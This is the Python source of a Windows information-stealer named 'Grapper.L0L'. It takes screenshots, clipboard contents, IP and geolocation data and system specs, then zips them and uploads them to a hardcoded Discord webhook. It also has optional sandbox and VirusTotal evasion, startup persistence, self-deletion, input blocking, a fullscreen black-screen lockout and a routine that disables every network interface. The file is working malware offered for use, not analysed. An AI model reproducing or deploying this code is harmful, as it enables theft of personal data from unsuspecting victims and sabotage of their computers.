admin_ask = False
anti_vm = False
anti_vt = False
anti_arun = False
destruct = False
hide = False
ss = False
startup = False
con_info = False
pc_info = False
steal_clipboard = False
down_file = False
play_music = False

fuck_internet = False
black_screen = False
fuck_input = False


import os
try:
    import requests
    import psutil
    import json
    import platform
    import sys
    import socket
    import ctypes
    import secrets
    import string
    import shutil
    import pyautogui
    import subprocess
    import time
    import pygame
    import zipfile
    import tkinter as tk

except Exception as e:
    if hide:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        ctypes.windll.user32.MoveWindow(hwnd, 50000, 500000, 800, 600, True)
    for pac in ["requests","psutil","pyautogui","secrets","pygame"]:
        os.system(f"pip install -q {pac}")
    import requests
    import psutil
    import json
    import platform
    import sys
    import socket
    import ctypes
    import secrets
    import string
    import shutil
    import pyautogui
    import subprocess
    import time
    import pygame
    import zipfile
    import tkinter as tk

os.system("cls")
class util:
    def destruct():
        os.remove(os.path.abspath(__file__))

    def gen_str(length):
        stringg = ''.join(secrets.choice(string.ascii_letters) for _ in range(length))
        return stringg

class dir:
    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    pictures = os.path.join(os.path.expanduser("~"), "Pictures")

class anti:
    def vm():
        ram_gb = psutil.virtual_memory().total / (1024 ** 3)
        if ram_gb < 4:
            return True

        disk_gb = psutil.disk_usage('/').total / (1024 ** 3)
        if disk_gb < 120:
            return True

        # from https://github.com/itschasa/Bypass-VirusTotal/blob/main/main.py (archive)
        def get_base_prefix_compat():
            return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

        def in_virtualenv(): 
            return get_base_prefix_compat() != sys.prefix

        if in_virtualenv():
            return True      
            
    def vt():
        user = os.getlogin()
        data = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt")
        data = data.text
        if user in data:
            return True
        
        name = socket.gethostname()
        data = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt")
        data = data.text
        if name in data:
            return True
        
    def arun():
        if platform.system() == "Windows" and platform.version().startswith("6.1"):
            return True
            

wb = 'https://discord.com/api/webhooks/1194365996660703242/wzvjwXLqC9sWrspTI13-HZuGPCs2cVKOuT4WcwNu8QPqk8OTtQKEnShIeRdAYx35n1Y4'

def send_embed():
    config = f"""
anti VM = {anti_vm}
anti Virustotal = {anti_vt}
anti any.run = {anti_arun}
auto destrct = {destruct}
hide = {hide}
screenshoot = {ss}
startup = {startup}
connection info fetcher = {con_info}
pc info fetcher = {pc_info}
clipboard stealer = {steal_clipboard}
file download = {down_file}
music player = {play_music}

internet fucker = {fuck_internet}
black screen = {black_screen}
input blocker = {fuck_input}
"""
    try:
        embed = {
            "title": "Grapper.L0L",
            "color": 16776960,
            "fields": [
                {"name": " 🔎 OS", "value": f"{platform.platform()}", "inline": False},
                {"name": " 👤 Win user", "value": f"{os.getlogin()}", "inline": False},
                {"name": " ⚙ Config", "value": f"{config}", "inline": False},

            ],
        }

        payload = {
            "username": "Grapper.L0L",
            "avatar_url": "https://avatar.png",
            "embeds": [embed],
        }

        requests.post(wb, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
    except:
        pass


def send_file(path):
    with open(path, 'rb') as file:
        files = {'file': (path, file)}
        requests.post(wb, files=files)

def send_message():
    try:
        payload = {
            "content": f"||@everyone|| {os.getlogin()} just got grabbed! gathering and sending info...",
            "username": "Grapper.L0L",
            "avatar_url": "https://avatar.png",
        }
        requests.post(wb, data=payload)
    except:
        pass

def alert(type):
    try:
        payload = {
            "content": f"||@everyone|| :rotating_light: ALERT! :rotating_light: {type} DETECTED!",
            "username": "Grapper.L0L",
            "avatar_url": "https://avatar.png",
        }
        requests.post(wb, data=payload)
    except:
        pass

while __name__ == "__main__":
    if anti_vm:
        try:
            if anti.vm():
                alert("VM")
                time.sleep(5)
                util.destruct()
                exit()
        except:
            pass

    if anti_vt:
        try:
            if anti.vt():
                alert("Virus total")
                time.sleep(5)
                util.destruct()
                exit()
        except:
            pass

    if anti_arun:
        try:
            if anti.arun():
                alert("Any.run")
                time.sleep(5)
                util.destruct()
                exit()
        except:
            pass

    if admin_ask:
        if ctypes.windll.shell32.IsUserAnAdmin():
            pass
        else:
            try:
                ctypes.windll.shell32.ShellExecuteW(
                    None,
                    "runas",
                    sys.executable,
                    " ".join(sys.argv),
                    None,
                    1 
                )
            except:
                pass

    if black_screen:
        try:
            pygame.init()
            screen_width, screen_height = 8000, 6000
            screen = pygame.display.set_mode((screen_width, screen_height))
            pygame.display.set_caption("R3CI was here btw")
            while True:
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        pygame.quit()
                        sys.exit()
                screen.fill((0, 0, 0))
                pygame.display.flip()
        except:
            pass
    
    if fuck_input:
        try:
            user32 = ctypes.windll.user32
            user32.BlockInput(True)
        except:
            pass


    if hide:
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            ctypes.windll.user32.MoveWindow(hwnd, 50000, 500000, 800, 600, True)
        except:
            pass

    folder_name = fr"C:\temp_{util.gen_str(5)}"
    os.mkdir(folder_name)
    send_message()
    send_embed()

    if startup:
        try:
            shutil.copy(os.path.abspath(__file__), dir.startup)
        except:
            pass

    if ss:
        try:
            pyautogui.screenshot().save(f"{folder_name}/screen.png")
        except:
            pass

    if con_info:
        try:
            result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
            if result.returncode == 0:
                ipcfgdata = result.stdout
            else:
                ipcfgdata = "Failed to fetch"
            r = requests.get("https://ipinfo.io/")
            data = f"""
    ip: {r.json().get('ip')}
    hostname: {r.json().get('hostname')}
    city: {r.json().get('city')}
    region: {r.json().get('region')}
    country: {r.json().get('country')}
    location: {r.json().get('loc')}
    org: {r.json().get('org')}
    postal: {r.json().get('postal')}
    timezone: {r.json().get('timezone')}

    $$$ --------------------------------------------- $$$

            {ipcfgdata}
            """
            with open(f"{folder_name}/connectioninfo.txt", "w") as f:
                f.write(data)
        except:
            pass


    if pc_info:
        try:
            os.mkdir(f"{folder_name}/pcinfo")
            system_info = f"""
    Main       

    System: {platform.system()},
    PC name: {platform.node()},
    Release: {platform.release()},
    Version: {platform.version()},
            """

            cpu_info = f"""
    CPU

    Processor: {platform.processor()}
    Architecture: {platform.architecture()[0]}
    Machine: {platform.machine()},
    Processor: {platform.processor()}
            """

            ram_info = f"""
    RAM

    Total Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB
    Available Memory: {round(psutil.virtual_memory().available / (1024 ** 3), 2)} GB
            """

            disk_info = f"""
    DISK

    Total Disk Space: {round(psutil.disk_usage('/').total / (1024 ** 3), 2)} GB
    Used Disk Space: {round(psutil.disk_usage('/').used / (1024 ** 3), 2)} GB
    Free Disk Space: {round(psutil.disk_usage('/').free / (1024 ** 3), 2)} GB
            """

            data = system_info + cpu_info + ram_info + disk_info

            with open(f"{folder_name}/pcinfo/Specs.txt", "w") as f:
                f.write(data)

        except:
            pass

    if steal_clipboard:
        try:
            root = tk.Tk()
            clipboard = root.clipboard_get()
            root.destroy()
            with open(f"{folder_name}/clipboard.txt", "w") as f:
                f.write(clipboard)
        except:
            pass

    if down_file:
        try:
            down_file_path = ''
            down_file_url = ''
            r = requests.get(down_file_url)
            r.raise_for_status()
            with open(down_file_path, 'wb') as file:
                file.write(r.content)
        except:
            pass

    if play_music:
        try:
            url = ''
            r = requests.get(url)
            r.raise_for_status()
            with open('C:/temp_music.mp3', 'wb') as file:
                file.write(r.content)

            os.system("cls")
            pygame.mixer.init()
            pygame.mixer.music.load("C:/temp_music.mp3")
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                time.sleep(1)
        except:
            pass

    if fuck_internet:
        try:
            interface_names = list(psutil.net_if_stats().keys())
            for name in interface_names:
                os.system(f'netsh interface set interface name="{name}" admin=DISABLED')
        except:
            pass

    with zipfile.ZipFile(f"{dir.pictures}/{os.getlogin()}.zip", 'w') as zip_file:
        for folder_root, _, files in os.walk(folder_name):
            for file in files:
                file_path = os.path.join(folder_root, file)
                arc_name = os.path.relpath(file_path, folder_name)
                zip_file.write(file_path, arc_name)

    send_file(f"{dir.pictures}/{os.getlogin()}.zip")
    time.sleep(3)
    os.remove(f"{dir.pictures}/{os.getlogin()}.zip")
    shutil.rmtree(folder_name)  

    if destruct:
        util.destruct()
    exit()
    